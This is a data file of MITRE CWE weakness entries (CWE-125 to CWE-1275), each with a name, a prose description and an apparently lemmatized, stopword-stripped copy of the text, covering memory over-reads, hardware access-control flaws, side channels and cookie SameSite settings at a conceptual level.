CWE-125,Out-of-bounds Read,"The product reads data past the end, or before the beginning, of the intended buffer.Typically, this can allow attackers to read sensitive information from other memory locations or cause a crash. A crash can occur when the code reads a variable amount of data and assumes that a sentinel exists to stop the read operation, such as a NUL in a string. The expected sentinel might not be located in the out-of-bounds memory, causing excessive data to be read, leading to a segmentation fault or a buffer overflow. The product may modify an index or perform pointer arithmetic that references a memory location that is outside of the boundaries of the buffer. A subsequent read operation then produces undefined or unexpected results.",product read datum past end beginning intended buffer typically allow attacker read sensitive information memory location cause crash crash occur code read variable datum assume sentinel exist stop read operation nul string expect sentinel locate bound memory cause excessive datum read lead segmentation fault buffer overflow product modify index perform pointer arithmetic reference memory location outside boundary buffer subsequent read operation produce undefined unexpected result
CWE-1250,Improper Preservation of Consistency Between Independent Representations of Shared State,"The product has or supports multiple distributed components or sub-systems that are each required to keep their own local copy of shared data - such as state or cache - but the product does not ensure that all local copies remain consistent with each other.In highly distributed environments, or on systems with distinct physical components that operate independently, there is often a need for each component to store and update its own local copy of key data such as state or cache, so that all components have the same ""view"" of the overall system and operate in a coordinated fashion. For example, users of a social media service or a massively multiplayer online game might be using their own personal computers while also interacting with different physical hosts in a globally distributed service, but all participants must be able to have the same ""view"" of the world. Alternately, a processor's Memory Management Unit (MMU) might have ""shadow"" MMUs to distribute its workload, and all shadow MMUs are expected to have the same accessible ranges of memory.In such environments, it becomes critical for the product to ensure that this ""shared state"" is consistently modified across all distributed systems. If state is not consistently maintained across all systems, then critical transactions might take place out of order, or some users might not get the same data as other users. When this inconsistency affects correctness of operations, it can introduce vulnerabilities in mechanisms that depend on consistent state.",product support multiple distribute component sub system require local copy share datum state cache product ensure local copy remain consistent highly distribute environment system distinct physical component operate independently need component store update local copy key datum state cache component view overall system operate coordinated fashion example user social medium service massively multiplayer online game personal computer interact different physical host globally distribute service participant able view world alternately processor memory management unit mmu shadow mmu distribute workload shadow mmus expect accessible range memory environment critical product ensure shared state consistently modify distribute system state consistently maintain system critical transaction place order user datum user inconsistency affect correctness operation introduce vulnerability mechanism depend consistent state
CWE-1251,Mirrored Regions with Different Values,"The product's architecture mirrors regions without ensuring that their contents always stay in sync.Having mirrored regions with different values might result in the exposure of sensitive information or possibly system compromise.In the interest of increased performance, one might need to duplicate a resource. A cache memory is a common example of this concept, which keeps a ""local"" copy of a data element in the high speed cache memory. Unfortunately, this speed improvement comes with a downside, since the product needs to ensure that the local copy always mirrors the original copy truthfully. If they get out of sync, the computational result is no longer true.During hardware design, memory is not the only item which gets mirrored. There are many other entities that get mirrored, as well: registers, memory regions, and, in some cases, even whole computational units. For example, within a multi-core processor, if all memory accesses for each and every core goes through a single Memory-Management Unit (MMU) then the MMU will become a performance bottleneck. In such cases, duplicating local MMUs that will serve only a subset of the cores rather than all of them may resolve the performance issue. These local copies are also called ""shadow copies"" or ""mirrored copies.""If the original resource never changed, local duplicate copies getting out of sync would never be an issue. However, the values of the original copy will sometimes change. When the original copy changes, the mirrored copies must also change, and change fast.This situation of shadow-copy-possibly-out-of-sync-with-original-copy might occur as a result of multiple scenarios, including the following: After the values in the original copy change, due to some reason the original copy does not send the ""update"" request to its shadow copies.After the values in the original copy change, the original copy dutifully sends the ""update"" request to its shadow copies, but due to some reason the shadow copy does not ""execute"" this update request.After the values in the original copy change, the original copy sends the ""update"" request to its shadow copies, and the shadow copy executes this update request faithfully. However, during the small time period when the original copy has ""new"" values and the shadow copy is still holding the ""old"" values, an attacker can exploit the old values. Then it becomes a race condition between the attacker and the update process of who can reach the target, shadow copy first, and, if the attacker reaches first, the attacker wins.The attacker might send a ""spoofed"" update request to the target shadow copy, pretending that this update request is coming from the original copy. This spoofed request might cause the targeted shadow copy to update its values to some attacker-friendly values, while the original copies remain unchanged by the attacker.Suppose a situation where the original copy has a system of reverting back to its original value if it does not hear back from all the shadow copies that such copies have successfully completed the update request. In such a case, an attack might occur as follows: (1) the original copy might send an update request; (2) the shadow copy updates it; (3) the shadow copy sends back the successful completion message; (4) through a separate issue, the attacker is able to intercept the shadow copy's completion message. In this case, the original copy thinks that the update did not succeed, hence it reverts to its original value. Now there is a situation where the original copy has the ""old"" value, and the shadow copy has the ""new"" value.",product architecture mirror region ensure content stay sync have mirror region different value result exposure sensitive information possibly system compromise interest increase performance need duplicate resource cache memory common example concept keep local copy data element high speed cache memory unfortunately speed improvement come downside product need ensure local copy mirror original copy truthfully sync computational result long true hardware design memory item gets mirror entity mirror register memory region case computational unit example multi core processor memory access core go single memory management unit mmu mmu performance bottleneck case duplicate local mmu serve subset core resolve performance issue local copy call shadow copy mirrored copy original resource change local duplicate copy get sync issue value original copy change original copy change mirror copy change change fast situation shadow copy possibly sync original copy occur result multiple scenario include follow value original copy change reason original copy send update request shadow copy value original copy change original copy dutifully send update request shadow copy reason shadow copy execute update request value original copy change original copy send update request shadow copy shadow copy execute update request faithfully small time period original copy new value shadow copy hold old value attacker exploit old value race condition attacker update process reach target shadow copy attacker reach attacker win attacker send spoof update request target shadow copy pretend update request come original copy spoofed request cause target shadow copy update value attacker friendly value original copy remain unchanged attacker suppose situation original copy system revert original value hear shadow copy copy successfully complete update request case attack occur follow original copy send update request shadow copy update shadow copy send successful completion message separate issue attacker able intercept shadow copy completion message case original copy think update succeed revert original value situation original copy old value shadow copy new value
CWE-1252,CPU Hardware Not Configured to Support Exclusivity of Write and Execute Operations,"The CPU is not configured to provide hardware support for exclusivity of write and execute operations on memory. This allows an attacker to execute data from all of memory.CPUs provide a special bit that supports exclusivity of write and execute operations. This bit is used to segregate areas of memory to either mark them as code (instructions, which can be executed) or data (which should not be executed). In this way, if a user can write to a region of memory, the user cannot execute from that region and vice versa. This exclusivity provided by special hardware bit is leveraged by the operating system to protect executable space. While this bit is available in most modern processors by default, in some CPUs the exclusivity is implemented via a memory-protection unit (MPU) and memory-management unit (MMU) in which memory regions can be carved out with exact read, write, and execute permissions. However, if the CPU does not have an MMU/MPU, then there is no write exclusivity. Without configuring exclusivity of operations via segregated areas of memory, an attacker may be able to inject malicious code onto memory and later execute it.",cpu configure provide hardware support exclusivity write execute operation memory allow attacker execute datum memory cpu provide special bit support exclusivity write execute operation bit segregate area memory mark code instruction execute datum execute way user write region memory user execute region vice versa exclusivity provide special hardware bit leverage operate system protect executable space bit available modern processor default cpu exclusivity implement memory protection unit mpu memory management unit mmu memory region carve exact read write execute permission cpu mmu mpu write exclusivity configure exclusivity operation segregated area memory attacker able inject malicious code memory later execute
CWE-1253,Incorrect Selection of Fuse Values,"The logic level used to set a system to a secure state relies on a fuse being unblown. An attacker can set the system to an insecure state merely by blowing the fuse.Fuses are often used to store secret data, including security configuration data. When not blown, a fuse is considered to store a logic 0, and, when blown, it indicates a logic 1. Fuses are generally considered to be one-directional, i.e., once blown to logic 1, it cannot be reset to logic 0. However, if the logic used to determine system-security state (by leveraging the values sensed from the fuses) uses negative logic, an attacker might blow the fuse and drive the system to an insecure state.",logic level set system secure state rely fuse unblown attacker set system insecure state merely blow fuse fuse store secret datum include security configuration datum blow fuse consider store logic blow indicate logic fuse generally consider directional blow logic reset logic logic determine system security state leverage value sense fuse use negative logic attacker blow fuse drive system insecure state
CWE-1254,Incorrect Comparison Logic Granularity,"The product's comparison logic is performed over a series of steps rather than across the entire string in one operation. If there is a comparison logic failure on one of these steps, the operation may be vulnerable to a timing attack that can result in the interception of the process for nefarious purposes.Comparison logic is used to compare a variety of objects including passwords, Message Authentication Codes (MACs), and responses to verification challenges. When comparison logic is implemented at a finer granularity (e.g., byte-by-byte comparison) and breaks in the case of a comparison failure, an attacker can exploit this implementation to identify when exactly the failure occurred. With multiple attempts, the attacker may be able to guesses the correct password/response to challenge and elevate their privileges.",product comparison logic perform series step entire string operation comparison logic failure step operation vulnerable timing attack result interception process nefarious purpose comparison logic compare variety object include password message authentication codes mac response verification challenge comparison logic implement fine granularity byte byte comparison break case comparison failure attacker exploit implementation identify exactly failure occur multiple attempt attacker able guesses correct password response challenge elevate privilege
CWE-1255,Comparison Logic is Vulnerable to Power Side-Channel Attacks,"A device's real time power consumption may be monitored during security token evaluation and the information gleaned may be used to determine the value of the reference token.The power consumed by a device may be instrumented and monitored in real time. If the algorithm for evaluating security tokens is not sufficiently robust, the power consumption may vary by token entry comparison against the reference value. Further, if retries are unlimited, the power difference between a ""good"" entry and a ""bad"" entry may be observed and used to determine whether each entry itself is correct thereby allowing unauthorized parties to calculate the reference value.",device real time power consumption monitor security token evaluation information glean determine value reference token power consume device instrument monitor real time algorithm evaluate security token sufficiently robust power consumption vary token entry comparison reference value retrie unlimited power difference good entry bad entry observe determine entry correct allow unauthorized party calculate reference value
CWE-1256,Improper Restriction of Software Interfaces to Hardware Features,"The product provides software-controllable device functionality for capabilities such as power and clock management, but it does not properly limit functionality that can lead to modification of hardware memory or register bits, or the ability to observe physical side channels.It is frequently assumed that physical attacks such as fault injection and side-channel analysis require an attacker to have physical access to the target device. This assumption may be false if the device has improperly secured power management features, or similar features. For mobile devices, minimizing power consumption is critical, but these devices run a wide variety of applications with different performance requirements. Software-controllable mechanisms to dynamically scale device voltage and frequency and monitor power consumption are common features in today's chipsets, but they also enable attackers to mount fault injection and side-channel attacks without having physical access to the device.Fault injection attacks involve strategic manipulation of bits in a device to achieve a desired effect such as skipping an authentication step, elevating privileges, or altering the output of a cryptographic operation. Manipulation of the device clock and voltage supply is a well-known technique to inject faults and is cheap to implement with physical device access. Poorly protected power management features allow these attacks to be performed from software. Other features, such as the ability to write repeatedly to DRAM at a rapid rate from unprivileged software, can result in bit flips in other memory locations (Rowhammer, [REF-1083]).Side channel analysis requires gathering measurement traces of physical quantities such as power consumption. Modern processors often include power metering capabilities in the hardware itself (e.g., Intel RAPL) which if not adequately protected enable attackers to gather measurements necessary for performing side-channel attacks from software.",product provide software controllable device functionality capability power clock management properly limit functionality lead modification hardware memory register bit ability observe physical channel frequently assume physical attack fault injection channel analysis require attacker physical access target device assumption false device improperly secure power management feature similar feature mobile device minimize power consumption critical device run wide variety application different performance requirement software controllable mechanism dynamically scale device voltage frequency monitor power consumption common feature today chipset enable attacker mount fault injection channel attack have physical access device fault injection attack involve strategic manipulation bit device achieve desire effect skip authentication step elevate privilege alter output cryptographic operation manipulation device clock voltage supply know technique inject fault cheap implement physical device access poorly protect power management feature allow attack perform software feature ability write repeatedly dram rapid rate unprivileged software result bit flip memory location rowhammer channel analysis require gather measurement trace physical quantity power consumption modern processor include power metering capability hardware intel rapl adequately protect enable attacker gather measurement necessary perform channel attack software
CWE-1257,Improper Access Control Applied to Mirrored or Aliased Memory Regions,"Aliased or mirrored memory regions in hardware designs may have inconsistent read/write permissions enforced by the hardware. A possible result is that an untrusted agent is blocked from accessing a memory region but is not blocked from accessing the corresponding aliased memory region.Hardware product designs often need to implement memory protection features that enable privileged software to define isolated memory regions and access control (read/write) policies. Isolated memory regions can be defined on different memory spaces in a design (e.g. system physical address, virtual address, memory mapped IO).Each memory cell should be mapped and assigned a system address that the core software can use to read/write to that memory. It is possible to map the same memory cell to multiple system addresses such that read/write to any of the aliased system addresses would be decoded to the same memory cell.This is commonly done in hardware designs for redundancy and simplifying address decoding logic. If one of the memory regions is corrupted or faulty, then that hardware can switch to using the data in the mirrored memory region. Memory aliases can also be created in the system address map if the address decoder unit ignores higher order address bits when mapping a smaller address region into the full system address.A common security weakness that can exist in such memory mapping is that aliased memory regions could have different read/write access protections enforced by the hardware such that an untrusted agent is blocked from accessing a memory address but is not blocked from accessing the corresponding aliased memory address. Such inconsistency can then be used to bypass the access protection of the primary memory block and read or modify the protected memory.An untrusted agent could also possibly create memory aliases in the system address map for malicious purposes if it is able to change the mapping of an address region or modify memory region sizes.",aliased mirror memory region hardware design inconsistent read write permission enforce hardware possible result untrusted agent block access memory region block access corresponding aliase memory region hardware product design need implement memory protection feature enable privileged software define isolate memory region access control read write policy isolated memory region define different memory space design system physical address virtual address memory map memory cell map assign system address core software use read write memory possible map memory cell multiple system address read write aliase system address decode memory cell commonly hardware design redundancy simplify address decoding logic memory region corrupted faulty hardware switch datum mirror memory region memory alias create system address map address decoder unit ignore high order address bit map small address region system address common security weakness exist memory mapping aliased memory region different read write access protection enforce hardware untrusted agent block access memory address block access correspond aliased memory address inconsistency bypass access protection primary memory block read modify protect memory untrusted agent possibly create memory alias system address map malicious purpose able change mapping address region modify memory region size
CWE-1258,Exposure of Sensitive System Information Due to Uncleared Debug Information,"The hardware does not fully clear security-sensitive values, such as keys and intermediate values in cryptographic operations, when debug mode is entered.Security sensitive values, keys, intermediate steps of cryptographic operations, etc. are stored in temporary registers in the hardware. If these values are not cleared when debug mode is entered they may be accessed by a debugger allowing sensitive information to be accessible by untrusted parties.",hardware fully clear security sensitive value key intermediate value cryptographic operation debug mode enter security sensitive value key intermediate step cryptographic operation etc store temporary register hardware value clear debug mode enter access debugger allow sensitive information accessible untrusted party
CWE-1259,Improper Restriction of Security Token Assignment,"The System-On-A-Chip (SoC) implements a Security Token mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. However, the Security Tokens are improperly protected.Systems-On-A-Chip (Integrated circuits and hardware engines) implement Security Tokens to differentiate and identify which actions originated from which agent. These actions may be one of the directives: 'read', 'write', 'program', 'reset', 'fetch', 'compute', etc. Security Tokens are assigned to every agent in the System that is capable of generating an action or receiving an action from another agent. Multiple Security Tokens may be assigned to an agent and may be unique based on the agent's trust level or allowed privileges. Since the Security Tokens are integral for the maintenance of security in an SoC, they need to be protected properly. A common weakness afflicting Security Tokens is improperly restricting the assignment to trusted components. Consequently, an improperly protected Security Token may be able to be programmed by a malicious agent (i.e., the Security Token is mutable) to spoof the action as if it originated from a trusted agent.",system chip soc implement security token mechanism differentiate action allow disallow transaction originate entity security tokens improperly protect systems chip integrated circuit hardware engine implement security tokens differentiate identify action originate agent action directive read write program reset fetch compute etc security tokens assign agent system capable generate action receive action agent multiple security tokens assign agent unique base agent trust level allow privilege security tokens integral maintenance security soc need protect properly common weakness afflict security tokens improperly restrict assignment trust component consequently improperly protect security token able program malicious agent security token mutable spoof action originate trusted agent
CWE-126,Buffer Over-read,The product reads from a buffer using buffer access mechanisms such as indexes or pointers that reference memory locations after the targeted buffer.This typically occurs when the pointer or its index is incremented to a position beyond the bounds of the buffer or when pointer arithmetic results in a position outside of the valid memory location to name a few. This may result in exposure of sensitive information or possibly a crash.,product read buffer buffer access mechanism index pointer reference memory location target buffer typically occur pointer index incremente position bound buffer pointer arithmetic result position outside valid memory location result exposure sensitive information possibly crash
CWE-1260,Improper Handling of Overlap Between Protected Memory Ranges,"The product allows address regions to overlap, which can result in the bypassing of intended memory protection.Isolated memory regions and access control (read/write) policies are used by hardware to protect privileged software. Software components are often allowed to change or remap memory region definitions in order to enable flexible and dynamically changeable memory management by system software.If a software component running at lower privilege can program a memory address region to overlap with other memory regions used by software running at higher privilege, privilege escalation may be available to attackers. The memory protection unit (MPU) logic can incorrectly handle such an address overlap and allow the lower-privilege software to read or write into the protected memory region, resulting in privilege escalation attack. An address overlap weakness can also be used to launch a denial of service attack on the higher-privilege software memory regions.",product allow address region overlap result bypassing intended memory protection isolated memory region access control read write policy hardware protect privileged software software component allow change remap memory region definition order enable flexible dynamically changeable memory management system software software component run low privilege program memory address region overlap memory region software run high privilege privilege escalation available attacker memory protection unit mpu logic incorrectly handle address overlap allow low privilege software read write protect memory region result privilege escalation attack address overlap weakness launch denial service attack high privilege software memory region
CWE-1261,Improper Handling of Single Event Upsets,"The hardware logic does not effectively handle when single-event upsets (SEUs) occur.Technology trends such as CMOS-transistor down-sizing, use of new materials, and system-on-chip architectures continue to increase the sensitivity of systems to soft errors. These errors are random, and their causes might be internal (e.g., interconnect coupling) or external (e.g., cosmic radiation). These soft errors are not permanent in nature and cause temporary bit flips known as single-event upsets (SEUs). SEUs are induced errors in circuits caused when charged particles lose energy by ionizing the medium through which they pass, leaving behind a wake of electron-hole pairs that cause temporary failures. If these failures occur in security-sensitive modules in a chip, it might compromise the security guarantees of the chip. For instance, these temporary failures could be bit flips that change the privilege of a regular user to root.",hardware logic effectively handle single event upset seu occur technology trend cmos transistor sizing use new material system chip architecture continue increase sensitivity system soft error error random cause internal interconnect coupling external cosmic radiation soft error permanent nature cause temporary bit flip know single event upset seus seu induce error circuit cause charge particle lose energy ionize medium pass leave wake electron hole pair cause temporary failure failure occur security sensitive module chip compromise security guarantee chip instance temporary failure bit flip change privilege regular user root
CWE-1262,Improper Access Control for Register Interface,"The product uses memory-mapped I/O registers that act as an interface to hardware functionality from software, but there is improper access control to those registers.Software commonly accesses peripherals in a System-on-Chip (SoC) or other device through a memory-mapped register interface. Malicious software could tamper with any security-critical hardware data that is accessible directly or indirectly through the register interface, which could lead to a loss of confidentiality and integrity.",product use memory map o register act interface hardware functionality software improper access control register software commonly access peripheral system chip soc device memory map register interface malicious software tamper security critical hardware data accessible directly indirectly register interface lead loss confidentiality integrity
CWE-1263,Improper Physical Access Control,"The product is designed with access restricted to certain information, but it does not sufficiently protect against an unauthorized actor with physical access to these areas.Sections of a product intended to have restricted access may be inadvertently or intentionally rendered accessible when the implemented physical protections are insufficient. The specific requirements around how robust the design of the physical protection mechanism needs to be depends on the type of product being protected. Selecting the correct physical protection mechanism and properly enforcing it through implementation and manufacturing are critical to the overall physical security of the product.",product design access restrict certain information sufficiently protect unauthorized actor physical access area section product intend restrict access inadvertently intentionally render accessible implement physical protection insufficient specific requirement robust design physical protection mechanism need depend type product protect select correct physical protection mechanism properly enforce implementation manufacturing critical overall physical security product
CWE-1264,Hardware Logic with Insecure De-Synchronization between Control and Data Channels,"The hardware logic for error handling and security checks can incorrectly forward data before the security check is complete.Many high-performance on-chip bus protocols and processor data-paths employ separate channels for control and data to increase parallelism and maximize throughput. Bugs in the hardware logic that handle errors and security checks can make it possible for data to be forwarded before the completion of the security checks. If the data can propagate to a location in the hardware observable to an attacker, loss of data confidentiality can occur. 'Meltdown' is a concrete example of how de-synchronization between data and permissions checking logic can violate confidentiality requirements. Data loaded from a page marked as privileged was returned to the cpu regardless of current privilege level for performance reasons. The assumption was that the cpu could later remove all traces of this data during the handling of the illegal memory access exception, but this assumption was proven false as traces of the secret data were not removed from the microarchitectural state.",hardware logic error handling security check incorrectly forward datum security check complete high performance chip bus protocol processor data path employ separate channel control datum increase parallelism maximize throughput bug hardware logic handle error security check possible datum forward completion security check datum propagate location hardware observable attacker loss datum confidentiality occur meltdown concrete example de synchronization datum permission checking logic violate confidentiality requirement datum load page mark privileged return cpu regardless current privilege level performance reason assumption cpu later remove trace datum handling illegal memory access exception assumption prove false trace secret datum remove microarchitectural state
CWE-1265,Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls,"During execution of non-reentrant code, the product performs a call that unintentionally produces a nested invocation of the non-reentrant code.In a complex product, a single function call may lead to many different possible code paths, some of which may involve deeply nested calls. It may be difficult to foresee all possible code paths that could emanate from a given function call. In some systems, an external actor can manipulate inputs to the system and thereby achieve a wide range of possible control flows. This is frequently a concern in products that execute scripts from untrusted sources. Examples of such products are web browsers and PDF readers. A weakness is present when one of the possible code paths resulting from a function call alters program state that the original caller assumes to be unchanged during the call.",execution non reentrant code product perform unintentionally produce nest invocation non reentrant code complex product single function lead different possible code path involve deeply nest call difficult foresee possible code path emanate give function system external actor manipulate input system achieve wide range possible control flow frequently concern product execute script untrusted source example product web browser pdf reader weakness present possible code path result function alter program state original caller assume unchanged
CWE-1266,Improper Scrubbing of Sensitive Data from Decommissioned Device,"The product does not properly provide a capability for the product administrator to remove sensitive data at the time the product is decommissioned. A scrubbing capability could be missing, insufficient, or incorrect.When a product is decommissioned - i.e., taken out of service - best practices or regulatory requirements may require the administrator to remove or overwrite sensitive data first, i.e. ""scrubbing."" Improper scrubbing of sensitive data from a decommissioned device leaves that data vulnerable to acquisition by a malicious actor. Sensitive data may include, but is not limited to, device/manufacturer proprietary information, user/device credentials, network configurations, and other forms of sensitive data.",product properly provide capability product administrator remove sensitive datum time product decommission scrubbing capability missing insufficient incorrect product decommission take service good practice regulatory requirement require administrator remove overwrite sensitive datum scrubbing improper scrubbing sensitive datum decommission device leave data vulnerable acquisition malicious actor sensitive data include limit device manufacturer proprietary information user device credential network configuration form sensitive datum
CWE-1267,Policy Uses Obsolete Encoding,"The product uses an obsolete encoding mechanism to implement access controls.Within a System-On-a-Chip (SoC), various circuits and hardware engines generate transactions for the purpose of accessing (read/write) assets or performing various actions (e.g., reset, fetch, compute, etc.). Among various types of message information, a typical transaction is comprised of source identity (identifying the originator of the transaction) and a destination identity (routing the transaction to the respective entity). Sometimes the transactions are qualified with a Security Token. This Security Token helps the destination agent decide on the set of allowed actions (e.g., access to an asset for reads and writes). A policy encoder is used to map the bus transactions to Security Tokens that in turn are used as access-controls/protection mechanisms. A common weakness involves using an encoding which is no longer trusted, i.e., an obsolete encoding.",product use obsolete encoding mechanism implement access control system chip soc circuit hardware engine generate transaction purpose access read write asset perform action reset fetch compute etc type message information typical transaction comprise source identity identify originator transaction destination identity route transaction respective entity transaction qualify security token security token help destination agent decide set allow action access asset read write policy encoder map bus transaction security tokens turn access control protection mechanism common weakness involve encoding long trust obsolete encoding
CWE-1268,Policy Privileges are not Assigned Consistently Between Control and Data Agents,"The product's hardware-enforced access control for a particular resource improperly accounts for privilege discrepancies between control and write policies.Integrated circuits and hardware engines may provide access to resources (device-configuration, encryption keys, etc.) belonging to trusted firmware or software modules (commonly set by a BIOS or a bootloader). These accesses are typically controlled and limited by the hardware. Hardware design access control is sometimes implemented using a policy. A policy defines which entity or agent may or may not be allowed to perform an action. When a system implements multiple levels of policies, a control policy may allow direct access to a resource as well as changes to the policies themselves.Resources that include agents in their control policy but not in their write policy could unintentionally allow an untrusted agent to insert itself in the write policy register. Inclusion in the write policy register could allow a malicious or misbehaving agent write access to resources. This action could result in security compromises including leaked information, leaked encryption keys, or modification of device configuration.",product hardware enforce access control particular resource improperly account privilege discrepancy control write policy integrated circuit hardware engine provide access resource device configuration encryption key etc belong trust firmware software module commonly set bios bootloader access typically control limit hardware hardware design access control implement policy policy define entity agent allow perform action system implement multiple level policy control policy allow direct access resource change policy resource include agent control policy write policy unintentionally allow untrusted agent insert write policy register inclusion write policy register allow malicious misbehave agent write access resource action result security compromise include leak information leak encryption key modification device configuration
CWE-1269,Product Released in Non-Release Configuration,"The product released to market is released in pre-production or manufacturing configuration.Products in the pre-production or manufacturing stages are configured to have many debug hooks and debug capabilities, including but not limited to:Ability to override/bypass various cryptographic checks (including authentication, authorization, and integrity)Ability to read/write/modify/dump internal state (including registers and memory)Ability to change system configurationsAbility to run hidden or private commands that are not allowed during production (as they expose IP).The above is by no means an exhaustive list, but it alludes to the greater capability and the greater state of vulnerability of a product during it's preproduction or manufacturing state.Complexity increases when multiple parties are involved in executing the tests before the final production version. For example, a chipmaker might fabricate a chip and run its own preproduction tests, following which the chip would be delivered to the Original Equipment Manufacturer (OEM), who would now run a second set of different preproduction tests on the same chip. Only after both of these sets of activities are complete, can the overall manufacturing phase be called ""complete"" and have the ""Manufacturing Complete"" fuse blown. However, if the OEM forgets to blow the Manufacturing Complete fuse, then the system remains in the manufacturing stage, rendering the system both exposed and vulnerable.",product release market release pre production manufacturing configuration product pre production manufacturing stage configure debug hook debug capability include limit ability override bypass cryptographic check include authentication authorization read write modify dump internal state include register change system configurationsability run hidden private command allow production expose means exhaustive list allude great capability great state vulnerability product preproduction manufacturing state complexity increase multiple party involve execute test final production version example chipmaker fabricate chip run preproduction test follow chip deliver original equipment manufacturer oem run second set different preproduction test chip set activity complete overall manufacturing phase call complete manufacturing complete fuse blow oem forget blow manufacturing complete fuse system remain manufacturing stage render system exposed vulnerable
CWE-127,Buffer Under-read,"The product reads from a buffer using buffer access mechanisms such as indexes or pointers that reference memory locations prior to the targeted buffer.This typically occurs when the pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used. This may result in exposure of sensitive information or possibly a crash.",product read buffer buffer access mechanism index pointer reference memory location prior target buffer typically occur pointer index decremente position buffer pointer arithmetic result position beginning valid memory location negative index result exposure sensitive information possibly crash
CWE-1270,Generation of Incorrect Security Tokens,"The product implements a Security Token mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. However, the Security Tokens generated in the system are incorrect.Systems-On-a-Chip (SoC) (Integrated circuits and hardware engines) implement Security Tokens to differentiate and identify actions originated from various agents. These actions could be ""read"", ""write"", ""program"", ""reset"", ""fetch"", ""compute"", etc. Security Tokens are generated and assigned to every agent on the SoC that is either capable of generating an action or receiving an action from another agent. Every agent could be assigned a unique, Security Token based on its trust level or privileges. Incorrectly generated Security Tokens could result in the same token used for multiple agents or multiple tokens being used for the same agent. This condition could result in a Denial-of-Service (DoS) or the execution of an action that in turn could result in privilege escalation or unintended access.",product implement security token mechanism differentiate action allow disallow transaction originate entity security tokens generate system incorrect systems chip soc integrated circuit hardware engine implement security tokens differentiate identify action originate agent action read write program reset fetch compute etc security token generate assign agent soc capable generate action receive action agent agent assign unique security token base trust level privilege incorrectly generate security tokens result token multiple agent multiple token agent condition result denial service dos execution action turn result privilege escalation unintended access
CWE-1271,Uninitialized Value on Reset for Registers Holding Security Settings,"Security-critical logic is not set to a known value on reset.When the device is first brought out of reset, the state of registers will be indeterminate if they have not been initialized by the logic. Before the registers are initialized, there will be a window during which the device is in an insecure state and may be vulnerable to attack.",security critical logic set known value reset device bring reset state register indeterminate initialize logic register initialize window device insecure state vulnerable attack
CWE-1272,Sensitive Information Uncleared Before Debug/Power State Transition,"The product performs a power or debug state transition, but it does not clear sensitive information that should no longer be accessible due to changes to information access restrictions.A device or system frequently employs many power and sleep states during its normal operation (e.g., normal power, additional power, low power, hibernate, deep sleep, etc.). A device also may be operating within a debug condition. State transitions can happen from one power or debug state to another. If there is information available in the previous state which should not be available in the next state and is not properly removed before the transition into the next state, sensitive information may leak from the system.",product perform power debug state transition clear sensitive information long accessible change information access restriction device system frequently employ power sleep state normal operation normal power additional power low power hibernate deep sleep etc device operate debug condition state transition happen power debug state information available previous state available state properly remove transition state sensitive information leak system
CWE-1273,Device Unlock Credential Sharing,"The credentials necessary for unlocking a device are shared across multiple parties and may expose sensitive information.""Unlocking a device"" often means activating certain unadvertised debug and manufacturer-specific capabilities of a device using sensitive credentials. Unlocking a device might be necessary for the purpose of troubleshooting device problems. For example, suppose a device contains the ability to dump the content of the full system memory by disabling the memory-protection mechanisms. Since this is a highly security-sensitive capability, this capability is ""locked"" in the production part. Unless the device gets unlocked by supplying the proper credentials, the debug capabilities are not available. For cases where the chip designer, chip manufacturer (fabricator), and manufacturing and assembly testers are all employed by the same company, the risk of compromise of the credentials is greatly reduced. However, the risk is greater when the chip designer is employed by one company, the chip manufacturer is employed by another company (a foundry), and the assemblers and testers are employed by yet a third company. Since these different companies will need to perform various tests on the device to verify correct device function, they all need to share the unlock key. Unfortunately, the level of secrecy and policy might be quite different at each company, greatly increasing the risk of sensitive credentials being compromised.",credential necessary unlock device share multiple party expose sensitive information device mean activate certain unadvertised debug manufacturer specific capability device sensitive credential unlock device necessary purpose troubleshoot device problem example suppose device contain ability dump content system memory disable memory protection mechanism highly security sensitive capability capability lock production device gets unlock supply proper credential debug capability available case chip designer chip manufacturer fabricator manufacturing assembly tester employ company risk compromise credential greatly reduce risk great chip designer employ company chip manufacturer employ company foundry assembler tester employ company different company need perform test device verify correct device function need share unlock key unfortunately level secrecy policy different company greatly increase risk sensitive credential compromise
CWE-1274,Improper Access Control for Volatile Memory Containing Boot Code,"The product conducts a secure-boot process that transfers bootloader code from Non-Volatile Memory (NVM) into Volatile Memory (VM), but it does not have sufficient access control or other protections for the Volatile Memory.Adversaries could bypass the secure-boot process and execute their own untrusted, malicious boot code.As a part of a secure-boot process, the read-only-memory (ROM) code for a System-on-Chip (SoC) or other system fetches bootloader code from Non-Volatile Memory (NVM) and stores the code in Volatile Memory (VM), such as dynamic, random-access memory (DRAM) or static, random-access memory (SRAM). The NVM is usually external to the SoC, while the VM is internal to the SoC. As the code is transferred from NVM to VM, it is authenticated by the SoC's ROM code.If the volatile-memory-region protections or access controls are insufficient to prevent modifications from an adversary or untrusted agent, the secure boot may be bypassed or replaced with the execution of an adversary's code.",product conduct secure boot process transfer bootloader code non volatile memory nvm volatile memory vm sufficient access control protection volatile memory adversary bypass secure boot process execute untrusted malicious boot code secure boot process read memory rom code system chip soc system fetch bootloader code non volatile memory nvm store code volatile memory vm dynamic random access memory dram static random access memory sram nvm usually external soc vm internal code transfer nvm vm authenticate soc rom code volatile memory region protection access control insufficient prevent modification adversary untrusted agent secure boot bypass replace execution adversary code
CWE-1275,Sensitive Cookie with Improper SameSite Attribute,"The SameSite attribute for sensitive cookies is not set, or an insecure value is used.The SameSite attribute controls how cookies are sent for cross-domain requests. This attribute may have three values: 'Lax', 'Strict', or 'None'. If the 'None' value is used, a website may create a cross-domain POST HTTP request to another website, and the browser automatically adds cookies to this request. This may lead to Cross-Site-Request-Forgery (CSRF) attacks if there are no additional protections in place (such as Anti-CSRF tokens).",samesite attribute sensitive cookie set insecure value samesite attribute control cookie send cross domain request attribute value lax strict value website create cross domain post http request website browser automatically add cookie request lead cross site request forgery csrf attack additional protection place anti csrf token
